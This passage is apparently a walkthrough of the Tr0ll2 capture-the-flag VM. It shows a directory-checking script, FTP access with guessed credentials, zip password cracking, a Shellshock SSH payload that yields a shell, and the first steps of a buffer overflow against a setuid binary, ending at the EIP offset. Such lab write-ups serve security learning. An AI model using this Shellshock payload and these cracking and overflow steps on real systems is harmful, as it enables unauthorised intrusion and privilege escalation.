<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">httplib</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">urllib2</span>
</span><span class='line'>
</span><span class='line'><span class="n">ip</span> <span class="o">=</span> <span class="s">&#39;10.10.10.141&#39;</span>
</span><span class='line'><span class="n">img_name</span> <span class="o">=</span> <span class="s">&#39;cat_the_troll.jpg&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># read URIs found in robots.txt</span>
</span><span class='line'><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;robots.txt&#39;</span><span class="p">,</span><span class="s">&#39;r&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">uri_list</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">readlines</span><span class="p">()</span>
</span><span class='line'><span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">uri_to_check</span> <span class="o">=</span> <span class="p">[]</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;[*] Start checking ...&#39;</span>
</span><span class='line'><span class="k">for</span> <span class="n">uri</span> <span class="ow">in</span> <span class="n">uri_list</span><span class="p">:</span>
</span><span class='line'>	<span class="n">conn</span> <span class="o">=</span> <span class="n">httplib</span><span class="o">.</span><span class="n">HTTPConnection</span><span class="p">(</span><span class="n">ip</span><span class="p">)</span>
</span><span class='line'>	<span class="n">conn</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s">&#39;GET&#39;</span><span class="p">,</span> <span class="p">(</span><span class="n">uri</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;/&#39;</span><span class="p">))</span>
</span><span class='line'>	<span class="n">response</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">getresponse</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>	<span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status</span> <span class="o">!=</span> <span class="mi">404</span><span class="p">:</span>							<span class="c"># filter error code 404 to make the result nice and tidy</span>
</span><span class='line'>		<span class="k">print</span> <span class="s">&#39;[+] &#39;</span> <span class="o">+</span> <span class="n">uri</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;/&#39;</span>
</span><span class='line'>		<span class="k">print</span> <span class="s">&#39;[-] &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">status</span><span class="p">)</span>
</span><span class='line'>		<span class="n">uri_to_check</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s">&#39;http://&#39;</span> <span class="o">+</span> <span class="n">ip</span> <span class="o">+</span> <span class="n">uri</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;/&#39;</span> <span class="o">+</span> <span class="n">img_name</span><span class="p">)</span>	<span class="c"># if the response code is not 404 then put in uri_to_check list for further analysis</span>
</span><span class='line'>
</span><span class='line'><span class="c"># save under inspection URIs to file for further analysis</span>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;[*] Saving result to file: uris_to_check.txt&#39;</span>
</span><span class='line'><span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">&#39;uris_to_check.txt&#39;</span><span class="p">,</span> <span class="s">&#39;w&#39;</span><span class="p">)</span>
</span><span class='line'><span class="k">for</span> <span class="n">uri</span> <span class="ow">in</span> <span class="n">uri_to_check</span><span class="p">:</span>
</span><span class='line'>	<span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">uri</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&#39;[*] Done!&#39;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><img class="left" src="/downloads/Tr0ll2/5.png"></p>

<p>Four directories gave 200 code response. Then I use <code>wget</code> with <code>-i</code> switch to download pictures from each directory.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/tr0ll2# wget -i uris_to_check.txt
</span><span class='line'>&ndash;2015-06-23 06:19:05&ndash;  &lt;a href="http://10.10.10.141/noob/cat_the_troll.jpg">http://10.10.10.141/noob/cat_the_troll.jpg&lt;/a>
</span><span class='line'>Connecting to 10.10.10.141:80&hellip; connected.
</span><span class='line'>HTTP request sent, awaiting response&hellip; 200 OK
</span><span class='line'>Length: 15831 (15K) [image/jpeg]
</span><span class='line'>Saving to: `cat_the_troll.jpg'&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>100%[====================================================================================================================>] 15,831      &ndash;.-K/s   in 0s&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>2015-06-23 06:19:05 (169 MB/s) - `cat_the_troll.jpg' saved [15831/15831]&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>&ndash;2015-06-23 06:19:05&ndash;  &lt;a href="http://10.10.10.141/keep_trying/cat_the_troll.jpg">http://10.10.10.141/keep_trying/cat_the_troll.jpg&lt;/a>
</span><span class='line'>Reusing existing connection to 10.10.10.141:80.
</span><span class='line'>HTTP request sent, awaiting response&hellip; 200 OK
</span><span class='line'>Length: 15831 (15K) [image/jpeg]
</span><span class='line'>Saving to: `cat_the_troll.jpg.1'&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>100%[====================================================================================================================>] 15,831      &ndash;.-K/s   in 0s&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>2015-06-23 06:19:05 (89.2 MB/s) - `cat_the_troll.jpg.1' saved [15831/15831]&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>&ndash;2015-06-23 06:19:05&ndash;  &lt;a href="http://10.10.10.141/dont_bother/cat_the_troll.jpg">http://10.10.10.141/dont_bother/cat_the_troll.jpg&lt;/a>
</span><span class='line'>Reusing existing connection to 10.10.10.141:80.
</span><span class='line'>HTTP request sent, awaiting response&hellip; 200 OK
</span><span class='line'>Length: 15873 (16K) [image/jpeg]
</span><span class='line'>Saving to: `cat_the_troll.jpg.2'&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>100%[====================================================================================================================>] 15,873      &ndash;.-K/s   in 0s&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>2015-06-23 06:19:05 (175 MB/s) - `cat_the_troll.jpg.2' saved [15873/15873]&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>&ndash;2015-06-23 06:19:05&ndash;  &lt;a href="http://10.10.10.141/ok_this_is_it/cat_the_troll.jpg">http://10.10.10.141/ok_this_is_it/cat_the_troll.jpg&lt;/a>
</span><span class='line'>Reusing existing connection to 10.10.10.141:80.
</span><span class='line'>HTTP request sent, awaiting response&hellip; 200 OK
</span><span class='line'>Length: 15831 (15K) [image/jpeg]
</span><span class='line'>Saving to: `cat_the_troll.jpg.3'&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>100%[====================================================================================================================>] 15,831      &ndash;.-K/s   in 0s&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>2015-06-23 06:19:05 (36.5 MB/s) - `cat_the_troll.jpg.3' saved [15831/15831]&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>FINISHED &ndash;2015-06-23 06:19:05&ndash;
</span><span class='line'>Total wall clock time: 0.02s
</span><span class='line'>Downloaded: 4 files, 62K in 0.001s (79.6 MB/s)
</span><span class='line'>root@kali:~/tr0ll2# ls -alh
</span><span class='line'>total 84K
</span><span class='line'>drwxr-xr-x  2 root root 4.0K Jun 23 06:19 .
</span><span class='line'>drwxr-xr-x 39 root root 4.0K Jun 23 04:58 ..
</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root  16K Oct  4  2014 cat_the_troll.jpg
</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root  16K Oct  4  2014 cat_the_troll.jpg.1
</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root  16K Oct  4  2014 cat_the_troll.jpg.2
</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root  16K Oct  4  2014 cat_the_troll.jpg.3
</span><span class='line'>-rwxr-xr-x  1 root root  927 Jun 23 06:18 robot_check.py
</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root  323 Jun 23 05:10 robots.txt
</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root  195 Jun 23 06:18 uris_to_check.txt</span></code></pre></td></tr></table></div></figure></p>

<p>Next I use <code>strings</code> to check each downloaded picture to find hidden information.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/tr0ll2# strings cat_the_troll.jpg.2
</span><span class='line'>JFIF&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;h1>3-652-108?QE8&lt;M=01F`GMTV[[7DcjcXjQY[W&lt;/h1>
</span><span class='line'>
</span><span class='line'>&lt;p>)W:1:WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
</span><span class='line'>&ldquo;aq2
</span><span class='line'>&hellip; &hellip; truncated &hellip; &hellip;
</span><span class='line'>]=%em;
</span><span class='line'>lj\p
</span><span class='line'>*/ p?E$
</span><span class='line'>Look Deep within y0ur_self for the answer</span></code></pre></td></tr></table></div></figure></p>

<p><code>y0ur_self</code> looks like another hidden directory on the server.</p>

<p><img class="left" src="/downloads/Tr0ll2/6.png"></p>

<p>Found <code>answer.txt</code> file which the content looks like encoded by base64. Then I decoded and save to file <code>answer2.txt</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/tr0ll2# cat answer.txt | base64 &ndash;decode > answer2.txt</span></code></pre></td></tr></table></div></figure></p>

<p>This file is more like a dictionary file and will be useful later.</p>

<h3>FTP &amp; ZIP Crack</h3>

<p>Now let&rsquo;s move to FTP service.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# ftp 10.10.10.141
</span><span class='line'>Connected to 10.10.10.141.
</span><span class='line'>220 Welcome to Tr0ll FTP&hellip; Only noobs stay for a while&hellip;
</span><span class='line'>Name (10.10.10.141:root): anonymous
</span><span class='line'>331 Please specify the password.
</span><span class='line'>Password:
</span><span class='line'>530 Login incorrect.
</span><span class='line'>Login failed.
</span><span class='line'>ftp> bye
</span><span class='line'>221 Goodbye.</span></code></pre></td></tr></table></div></figure></p>

<p>I firstly tried <code>anonymous</code> user to login but failed. After checking the MOTD message and used <code>Tr0ll / Tr0ll</code> as login credential, I logged in successfully.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~# ftp 10.10.10.141
</span><span class='line'>Connected to 10.10.10.141.
</span><span class='line'>220 Welcome to Tr0ll FTP&hellip; Only noobs stay for a while&hellip;
</span><span class='line'>Name (10.10.10.141:root): Tr0ll
</span><span class='line'>331 Please specify the password.
</span><span class='line'>Password:
</span><span class='line'>230 Login successful.
</span><span class='line'>Remote system type is UNIX.
</span><span class='line'>Using binary mode to transfer files.
</span><span class='line'>ftp> ls
</span><span class='line'>200 PORT command successful. Consider using PASV.
</span><span class='line'>150 Here comes the directory listing.
</span><span class='line'>-rw-r&ndash;r&ndash;    1 0        0            1474 Oct 04  2014 lmao.zip
</span><span class='line'>226 Directory send OK.
</span><span class='line'>ftp> get lmao.zip
</span><span class='line'>local: lmao.zip remote: lmao.zip
</span><span class='line'>200 PORT command successful. Consider using PASV.
</span><span class='line'>150 Opening BINARY mode data connection for lmao.zip (1474 bytes).
</span><span class='line'>226 Transfer complete.
</span><span class='line'>1474 bytes received in 0.00 secs (5272.7 kB/s)
</span><span class='line'>ftp> bye
</span><span class='line'>221 Goodbye.</span></code></pre></td></tr></table></div></figure></p>

<p>Here I found a zip file. After I downloaded it and trying to unzip the lmao.zip, it was asking for password&hellip;</p>

<p>Next I try to crack the zip password with the dictionary file found before.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/tr0ll2# fcrackzip -v -D -u -p ~/tr0ll2/answer2.txt lmao.zip
</span><span class='line'>found file &lsquo;noob&rsquo;, (size cp/uc   1300/  1679, flags 9, chk 1005)&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>PASSWORD FOUND!!!!: pw == ItCantReallyBeThisEasyRightLOL</span></code></pre></td></tr></table></div></figure></p>

<p>fcrackzip will found the password in seconds! Now I get in the lmao directory and found noob&rsquo;s SSH key file.</p>

<h3>SSH &amp; Shellshock</h3>

<p>Firstly, I tried to SSH login with noob&rsquo;s key file directly but failed. It looks like there is something command run forced.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/tr0ll2/lmao# ssh -i noob &lt;a href="&#x6d;&#x61;&#105;&#108;&#x74;&#x6f;&#58;&#x6e;&#111;&#111;&#98;&#64;&#x31;&#48;&#x2e;&#x31;&#x30;&#46;&#x31;&#48;&#46;&#x31;&#52;&#x31;">&#110;&#111;&#111;&#98;&#64;&#49;&#48;&#x2e;&#49;&#48;&#x2e;&#x31;&#48;&#x2e;&#49;&#52;&#49;&lt;/a>
</span><span class='line'>The authenticity of host &lsquo;10.10.10.141 (10.10.10.141)&rsquo; can&rsquo;t be established.
</span><span class='line'>ECDSA key fingerprint is 91:b8:6a:45:be:41:fd:c8:14:b5:02:a0:66:7c:8c:96.
</span><span class='line'>Are you sure you want to continue connecting (yes/no)? yes
</span><span class='line'>Warning: Permanently added &lsquo;10.10.10.141&rsquo; (ECDSA) to the list of known hosts.
</span><span class='line'>TRY HARDER LOL!
</span><span class='line'>Connection to 10.10.10.141 closed.</span></code></pre></td></tr></table></div></figure></p>

<p>By searching in google, I found <em>shellshock</em> bug will help to bypass this and make commands execute. For more details about how to exploit SSH via exploiting <em>shellshock</em> vulnerability, please check: <a href="http://unix.stackexchange.com/questions/157477/how-can-shellshock-be-exploited-over-ssh">here</a> and <a href="http://bloggars-online.blogspot.ca/2014/10/bash-shellshock-ssh-exploit.html">here</a></p>

<p>So I tried the following command and it works!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/tr0ll2/lmao# ssh -i noob &lt;a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#111;&#x3a;&#110;&#x6f;&#x6f;&#98;&#64;&#x31;&#48;&#x2e;&#x31;&#48;&#x2e;&#x31;&#x30;&#x2e;&#x31;&#x34;&#x31;">&#110;&#111;&#x6f;&#98;&#x40;&#49;&#48;&#46;&#x31;&#x30;&#x2e;&#x31;&#x30;&#46;&#x31;&#52;&#x31;&lt;/a> &lsquo;() { :;}; /bin/bash&rsquo;
</span><span class='line'>id
</span><span class='line'>uid=1002(noob) gid=1002(noob) groups=1002(noob)
</span><span class='line'>python -c &ldquo;import pty; pty.spawn(&lsquo;/bin/bash&rsquo;)&rdquo;
</span><span class='line'>noob@Tr0ll2:~$ id
</span><span class='line'>id
</span><span class='line'>uid=1002(noob) gid=1002(noob) groups=1002(noob)
</span><span class='line'>noob@Tr0ll2:~$ pwd
</span><span class='line'>pwd
</span><span class='line'>/home/noob</span></code></pre></td></tr></table></div></figure></p>

<p>Now I have already broken into the shell.</p>

<p>By poking around in the file system, I found three &lsquo;door&rsquo; files under <code>/nothing_to_see_here/choose_wisely/</code>. There is <code>r00t</code> file in each door folder and they will change every couple of minutes.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ ls -al *
</span><span class='line'>ls -al *
</span><span class='line'>door1:
</span><span class='line'>total 16
</span><span class='line'>drwsr-xr-x 2 root root 4096 Oct  4  2014 .
</span><span class='line'>drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
</span><span class='line'>-rwsr-xr-x 1 root root 7271 Oct  4  2014 r00t&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>door2:
</span><span class='line'>total 20
</span><span class='line'>drwsr-xr-x 2 root root 4096 Oct  5  2014 .
</span><span class='line'>drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
</span><span class='line'>-rwsr-xr-x 1 root root 8401 Oct  5  2014 r00t&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>door3:
</span><span class='line'>total 16
</span><span class='line'>drwsr-xr-x 2 root root 4096 Oct  5  2014 .
</span><span class='line'>drwsr-xr-x 5 root root 4096 Oct  4  2014 ..
</span><span class='line'>-rwsr-xr-x 1 root root 7273 Oct  5  2014 r00t</span></code></pre></td></tr></table></div></figure></p>

<p>After several trial and error, I found the <code>r00t</code> file with biggest size is the target which is vulnerable to buffer overflow.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t $(python -c &lsquo;print &ldquo;A&rdquo; * 500&rsquo;)
</span><span class='line'>&lt;_here/choose_wisely/door1$ ./r00t $(python -c &lsquo;print &ldquo;A&rdquo; * 500&rsquo;)          &lt;br/>
</span><span class='line'>Segmentation fault</span></code></pre></td></tr></table></div></figure></p>

<p>Aha, <code>Segmentation fault</code> looks good so far. Then I upload <code>checksec.sh</code> script to check protections.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./checksec.sh &ndash;file r00t
</span><span class='line'>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
</span><span class='line'>Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   r00t</span></code></pre></td></tr></table></div></figure></p>

<p>Great, nearly no protection. Now it&rsquo;s time to move on to find and overflow the EIP.</p>

<p>Firstly, I use <code>pattern_create.rb</code> to generate 500 unique strings:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/tr0ll2# /usr/share/metasploit-framework/tools/pattern_create.rb 500
</span><span class='line'>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq</span></code></pre></td></tr></table></div></figure></p>

<p>Then use <code>gdb</code> on target machine to track the value of EIP when overflow happened.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ gdb -q ./r00t
</span><span class='line'>gdb -q ./r00t
</span><span class='line'>Reading symbols from /nothing_to_see_here/choose_wisely/door1/r00t&hellip;done.
</span><span class='line'>(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq
</span><span class='line'>&lt;7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq                &lt;br/>
</span><span class='line'>Starting program: /nothing_to_see_here/choose_wisely/door1/r00t Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x6a413969 in ?? ()
</span><span class='line'>(gdb) i r esp
</span><span class='line'>i r esp
</span><span class='line'>esp            0xbffffab0   0xbffffab0
</span><span class='line'>(gdb)</span></code></pre></td></tr></table></div></figure></p>

<p><code>0x6a413969</code> is the pattern, and I use <code>pattern_offset.rb</code> to get the offset is <font color="red">268</font>. Also, I got the value in ESP is <code>0xbffffab0</code></p>

